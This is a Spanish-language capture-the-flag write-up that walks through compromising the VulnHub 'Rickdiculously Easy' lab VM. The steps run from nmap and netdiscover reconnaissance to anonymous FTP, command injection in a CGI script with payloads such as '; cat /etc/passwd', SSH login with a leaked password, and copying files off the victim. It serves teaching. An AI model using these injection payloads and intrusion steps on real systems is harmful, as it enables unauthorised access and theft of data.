# Rickdiculously Easy (VulnHub) en VMware — WriteUp (hasta filtrado de credenciales en imagen)

> **Aviso (ético y legal):** Todo lo descrito es **solo para laboratorio/CTF**. No lo uses contra sistemas reales sin autorización.

---

## Qué vas a ver aquí

Este writeup documenta (paso a paso y sin omitir comandos) el flujo que seguimos:

- Descubrir la IP de la víctima en una red VMware aislada
- Enumerar puertos/servicios (metodología “lab” y metodología real en fases)
- Explotar **FTP anónimo** para obtener una flag
- Enumerar **HTTP 80** (directory listing + robots.txt)
- Encontrar **Command Injection** en `tracertool.cgi` para ejecutar comandos remotos como `apache`
- Acceder a **Cockpit** en `9090` (servicio web detectado por Nmap) y obtener una flag
- Detectar que el **SSH real** está en **22222**, acceder como `Summer` con la password encontrada
- Post-explotación básica (`sudo -l`) + pivot en `/home`
- Exfiltrar archivos a Kali y analizar una imagen para filtrar la contraseña de un ZIP

> Nos quedamos **a propósito** en el punto de “password filtrada en imagen”, y el writeup termina ahí (luego se ampliará).

---

## Evidencias visuales usadas (imágenes)

- Imagen 1: consola inicial/login VM  
- Imagen 2: netdiscover + ifconfig  
- Imagen 3: /passwords/ directory listing  
- Imagen 4: web `tracertool.cgi` (form)  
- Imagen 5: “troleo” al ejecutar `cat /etc/passwd` (salida alterada tipo gato)  
- Imagen 6: panel Cockpit en 9090 con flag  

---

## 1) Arranque de la VM y contexto inicial

Tras arrancar la VM en VMware, aparece la consola del sistema pidiendo login local.

📷 **Imagen 1 — Consola inicial**
![Consola inicial](images/01-vm-boot-login.png)

En este punto, como no tenemos credenciales ni documentación previa, lo correcto es empezar como en una auditoría real:

1) descubrir la IP  
2) confirmar conectividad  
3) enumerar servicios expuestos  

---

## 2) Descubrimiento de hosts con netdiscover (ARP)

### 2.1 Ejecutar netdiscover

En Kali:

```bash
sudo netdiscover
```

**Qué hace realmente:**
- `netdiscover` hace reconocimiento por **ARP** (capa 2).
- ARP se usa en LAN para resolver **IP → MAC**.
- Por eso es ideal si Kali y la víctima están en la **misma red virtual** de VMware.

**Por qué `sudo`:**
- necesita permisos para enviar/capturar ARP (raw sockets / captura).

📷 **Imagen 2 — netdiscover + ifconfig**
![netdiscover + ifconfig](images/02-netdiscover-ifconfig.png)

---

## 3) Identificar mi IP y rango con ifconfig

Para afinar el rango correcto:

```bash
ifconfig
```

Salida relevante (tu caso):

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.184.128  netmask 255.255.255.0  broadcast 192.168.184.255
```

**Interpretación:**
- `inet 192.168.184.128` → IP de Kali  
- `netmask 255.255.255.0` → máscara /24  
- rango → `192.168.184.0/24`

---

## 4) `netdiscover --help` (qué flags existen y por qué importan)

```bash
netdiscover --help
```

Flags clave:
- `-i device`: elegir interfaz (ej. `eth0`)
- `-r range`: escanear un rango concreto (ej. `192.168.247.0/24`)
- `-p`: modo pasivo (solo sniff)
- `-f`: fast mode
- `-P/-L`: salida parseable

En laboratorio, `-r` suele ser el más útil porque evita que netdiscover “adivine” rangos comunes.

---

## 5) Red aislada VMware (por qué creamos 192.168.247.0/24)

Para asegurar visibilidad entre Kali y la víctima, se creó una red virtual nueva:

- `192.168.247.0/24`

**Por qué se hace en auditorías/labs:**
- Aislar el tráfico (menos interferencias)
- Controlar el rango (más fácil identificar hosts)
- Evitar mezclar con redes reales
- Mejor soporte de ARP (netdiscover funciona “de libro”)

Escaneo ARP dirigido:

```bash
sudo netdiscover -r 192.168.247.0/24
```

- `-r`: fuerza el rango exacto.

Después confirmas tu IP en esa red:

```bash
ifconfig
```

Tu Kali:
- `192.168.247.129`

Hosts típicos que aparecen:
- `192.168.247.1` → gateway virtual VMware  
- `192.168.247.254` → DHCP VMware  
- `192.168.247.128` → la otra VM (probable víctima)  

---

## 6) Confirmación con Nmap (escaneo de lab)

```bash
nmap -p- -sCV -n -Pn -vvv --open -T5 -oN Rickdiculously 192.168.247.128
```

### 6.1 Explicación (extendida) de flags

- `-p-`: escanea **1–65535**.  
  En CTFs es importante porque esconden servicios en puertos altos (22222, 60000…).

- `-sC`: scripts NSE por defecto.  
  Útil para detectar rápidamente misconfigs (`ftp-anon`, `http-methods`, etc.).

- `-sV`: detección de versiones/banners.  
  Te dice “qué está corriendo” y acelera la priorización.

- `-n`: sin DNS.

- `-Pn`: asume host UP.

- `-vvv`: muy verboso (ves descubrimientos en vivo).

- `--open`: solo puertos open.

- `-T5`: timing agresivo (ok en lab, malo en real).

- `-oN`: guarda salida en fichero.

Resultado (puertos relevantes):
- 21 FTP
- 22 SSH
- 80 HTTP
- 9090 HTTP (Cockpit)
- 13337 unknown
- 22222 SSH
- 60000 unknown

**Primera lectura rápida:**
👉 máquina llena de servicios intencionadamente vulnerables.

---

## 7) Metodología realista: Nmap en fases (por qué sería distinto)

### Fase 1: descubrir puertos (más sutil)

```bash
nmap 192.168.247.128 -sS -T0
```

- `-sS`: SYN scan
- `-T0`: timing ultra lento (menos agresivo)

### Fase 2: enumeración dirigida (sobre la lista de puertos open)

```bash
nmap 192.168.247.128 -p21,22,80,9090,13337,22222,60000 -sCV
```

**Por qué:**
- hacer `-sC/-sV` contra `-p-` mete mucho tráfico (muy visible en PCAP/IDS)
- hacerlo solo en 4–10 puertos reduce muchísimo el ruido

En este lab, usamos un enfoque “moderadamente sutil”.

---

## 8) FTP (21): anonymous login + flag

Nmap mostró `ftp-anon: Anonymous FTP login allowed`.

Esto significa:
- puedes entrar sin credenciales “reales”
- riesgo real: fuga de archivos / subida no controlada (según permisos)

### 8.1 Conectar

```bash
ftp -a 192.168.247.128
```

- `-a`: fuerza login anónimo.

Dentro:

```text
ftp> ls
```

Ves `FLAG.txt`.

Descargas:

```text
ftp> get FLAG.txt
```

Lees en Kali:

```bash
cat FLAG.txt
```

Flag:
- `FLAG{Whoa this is unexpected} - 10 Points`

---

## 9) HTTP (80): enumeración de rutas con dirsearch

Primero, metodología típica web:
- enumerar directorios/rutas
- detectar listing
- revisar robots.txt
- mirar código fuente por comentarios

### 9.1 SecLists (opcional)

```bash
sudo git clone https://github.com/danielmiessler/SecLists.git
```

Pero como tarda, usamos dirsearch.

### 9.2 Dirsearch

```bash
dirsearch -u http://192.168.247.128
```

Hallazgos importantes:
- `/passwords/` (200)
- `/robots.txt` (200)
- `/cgi-bin/` (403)

---

## 10) `/passwords/`: directory listing + password en comentarios

📷 **Imagen 3 — /passwords/**
![Index /passwords](images/03-web-passwords-index.png)

Entras a:
- `http://192.168.247.128/passwords/`

Dentro hay:
- `FLAG.txt`
- `passwords.html`

En `passwords.html` aparece:

```html
<!--Password: winter-->
```

✅ Esto es muy realista: credenciales filtradas en comentarios HTML.

---

## 11) `robots.txt`: por qué es oro en CTF

`robots.txt` le dice a los bots qué no indexar.

Pero:
- **no protege nada**
- cualquiera puede verlo

En CTF suele contener:
- rutas “secretas”
- paneles
- scripts internos

Aquí revela:
- `/cgi-bin/root_shell.cgi`
- `/cgi-bin/tracertool.cgi`

---

## 12) `tracertool.cgi`: command injection (RCE como apache)

Vas a:

- `http://192.168.247.128/cgi-bin/tracertool.cgi`

📷 **Imagen 4**
![tracertool](images/04-tracertool-form.png)

Prueba:

```
192.168.247.128; whoami; pwd
```

**Qué demuestra:**
- el backend concatena input en un comando del sistema
- `;` rompe el comando original y añade otros
- ejecutas como usuario `apache` (servicio web)

Listas el directorio:

```
; ls -la
```

---

## 13) Imagen 5: “troleo” al ejecutar `cat /etc/passwd`

Al intentar:

```
; cat /etc/passwd
```

la salida no es la esperada: aparece una salida “troleada”.

📷 **Imagen 5 — salida alterada**
![cat troleado](images/05-tracertool-output-cat-troll.png)

**Qué significa y por qué puede pasar:**
- En CTF se puede **programar el CGI** para detectar comandos concretos y devolver una salida “plantada”.
- Es una forma de:
  - trolear
  - forzarte a cambiar técnica
  - simular un “filtro” casero

### 13.1 Bypass con `tail`/`head`

```text
; tail -n 30 /etc/passwd
```

Ahora sí ves usuarios reales, y detectas cuáles tienen shell:

- `/bin/bash` → usuarios interactivos (posible SSH)
- `/sbin/nologin` → usuarios de servicio

Esto te deja una lista útil:
- `RickSanchez`
- `Morty`
- `Summer`

---

## 14) Por qué pasamos al puerto 9090 (y por qué lo tratamos como web)

En Nmap aparece:

```text
9090/tcp  open  http    Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.247.128:9090/
| http-methods: 
|_  Supported Methods: GET HEAD
```

### 14.1 Qué significa exactamente

- `open http`: responde como **servicio web**
- `Cockpit web service`: es un panel admin típico en Fedora/RHEL
- `Did not follow redirect to https://...`: el servicio fuerza HTTPS y Nmap lo detecta

Por eso lo abrimos en navegador como:

- `https://192.168.247.128:9090/`

### 14.2 Por qué es importante (en serio)

Un panel admin expuesto:
- amplía superficie de ataque
- puede filtrar versiones y configuración
- puede permitir login con usuarios del sistema
- en CTF suele contener flags/pistas (aquí, una flag)

📷 **Imagen 6**
![Cockpit](images/06-cockpit-9090-flag.png)

---

## 15) Puertos 13337 / 22222 / 60000 (solo lo que usamos)

Escaneo dirigido:

```bash
nmap 192.168.247.128 -p13337,22222,60000 -sCV
```

Interpretación útil para nuestra ruta:

- `22222/tcp open ssh OpenSSH 7.5` → **SSH real en puerto no estándar**
- `13337/tcp` → devuelve flag directa (banner/fingerprint)
- `60000/tcp` → banner raro (lo dejamos para ampliación)

---

## 16) SSH real en 22222 (por qué funciona)

Ya teníamos:
- password candidata `winter` (comentario HTML)
- usuarios candidatos (de `/etc/passwd` vía `tail`)

Probamos:

```bash
ssh Summer@192.168.247.128 -p 22222
```

- `-p 22222`: puerto alternativo SSH
- usuario `Summer`
- password `winter`

✅ Acceso conseguido.

---

## 17) Post-explotación básica en SSH (Summer)

Comandos típicos:

```bash
whoami
pwd
ls -la
```

Lees flag sin ensuciar la terminal:

```bash
head FLAG.txt
```

**Por qué `head`:**
- el archivo tiene ASCII art grande
- `head` te da la flag rápido sin scroll infinito

---

## 18) `sudo -l`: por qué se ejecuta y qué concluye

```bash
sudo -l
```

**Para qué sirve:**
- lista comandos permitidos con sudo (posible escalada a root)

En tu caso:
- `Summer` **no puede** usar sudo.

Conclusión: no escalamos por sudo.

---

## 19) Pivot local: por qué revisamos `/home`

Como no hay escalada directa, pivotamos buscando artefactos:

```bash
cd ..
ls
```

Ves:
- `Morty`
- `RickSanchez`
- `Summer`

Ir a Morty:

```bash
cd Morty
ls
```

Aparecen:
- `journal.txt.zip`
- `Safe_Password.jpg`

En CTF, esto suele significar:
- credenciales
- pistas
- contraseñas
- material para estego/forense

Objetivo: llevar esos ficheros a Kali.

---

## 20) SCP: por qué el primer intento falla y cuál es el correcto

### 20.1 Qué es `scp`

`scp` (Secure Copy Protocol) copia archivos **usando SSH**.

Modelo mental:
- tu Kali se conecta por SSH a la víctima
- autentica como un usuario
- y copia ficheros (pull/push)

### 20.2 Por qué “no funciona” el primer intento

Intentaste:

```bash
scp -P 22222 summer@192.168.247.128:/home/Morty/journal.txt.zip ./
```

Falla con `Permission denied` porque:
- `summer` (minúsculas) no es el usuario válido (Linux distingue mayúsculas/minúsculas)
- además, si autenticas con un usuario que no tiene permisos de lectura, también fallará

### 20.3 Comando correcto (tu caso)

```bash
scp -P 22222 Summer@192.168.247.128:/home/Morty/journal.txt.zip ./
scp -P 22222 Summer@192.168.247.128:/home/Morty/Safe_Password.jpg ./
```

- `-P` mayúscula: puerto (en scp es `-P`, no `-p`)
- usuario correcto: `Summer`

✅ Así los descargas a Kali.

---

## 21) Exfil alternativa: servidor HTTP con Python desde la sesión SSH

Aunque scp ya sirve, este paso es muy común como “plan B”.

### 21.1 Intento en puerto 80 (falla)

En la víctima, como `Summer`:

```bash
python3 -m http.server 80
```

Falla con `Permission denied`.

### 21.2 Por qué el 80 es puerto privilegiado

En Linux/Unix:

- Puertos `0–1023` = **privileged ports**
  - Solo root (o procesos con capacidad especial) pueden abrirlos (`bind`)
- Puertos `1024+` = no privilegiados
  - cualquier usuario normal puede abrirlos

Como `Summer` no es root, no puede abrir el 80.

### 21.3 Solución: usar 8080

```bash
python3 -m http.server 8080
```

Esto levanta un servidor HTTP simple que publica el directorio actual (`/home/Summer`).

### 21.4 Descargar desde Kali con wget

Ejemplo:

```bash
wget http://192.168.247.128:8080/Safe_Password.jpg
```

**Qué significa este paso en la práctica:**
- estamos usando la sesión SSH para “montar” un servidor de archivos temporal en la víctima
- y desde Kali lo descargamos por HTTP
- esto permite analizar el ZIP/JPG localmente con herramientas forenses cómodas

---

## 22) Análisis del JPG: metadatos y strings

### 22.1 exiftool (metadatos)

```bash
exiftool Safe_Password.jpg
```

Objetivo:
- buscar comentarios EXIF
- autor/software
- campos `UserComment`, etc.

En tu caso no aparece nada clave.

### 22.2 strings (texto embebido)

```bash
strings Safe_Password.jpg
```

Aquí se filtra:

- `Password: Meeseek`

Conclusión:
- password del ZIP `journal.txt.zip` es **Meeseek**

Y aquí paramos el writeup.

---

## Conclusiones (lo que se ha logrado hasta ahora)

- **Reconocimiento ARP** con `netdiscover` para localizar la víctima en la red VMware.
- **Enumeración completa** con Nmap (y explicación de metodología real por fases).
- **FTP anónimo** explotado para obtener una flag (misconfig).
- **Enumeración web** en 80 con `dirsearch`, encontrando `/passwords/` y `robots.txt`.
- **Credencial filtrada** (`winter`) en comentario HTML.
- **Command Injection** en `tracertool.cgi` para ejecutar comandos remotos como `apache` (RCE).
- Identificación de usuarios válidos mediante `/etc/passwd` (bypass al “troleo” del `cat`).
- Acceso a **Cockpit** en `9090` porque Nmap lo identifica como HTTP + redirect a HTTPS.
- Descubrimiento de **SSH real en 22222** y acceso como `Summer`.
- Post-explotación mínima (`sudo -l`) y pivot en `/home`.
- Exfiltración de `journal.txt.zip` y `Safe_Password.jpg` (SCP + alternativa con `python -m http.server`).
- **Filtrado de credenciales** desde el JPG con `strings`: password `Meeseek`.

**Estado final:** estamos en el punto de tener la contraseña del ZIP y dejamos el resto para una ampliación posterior.

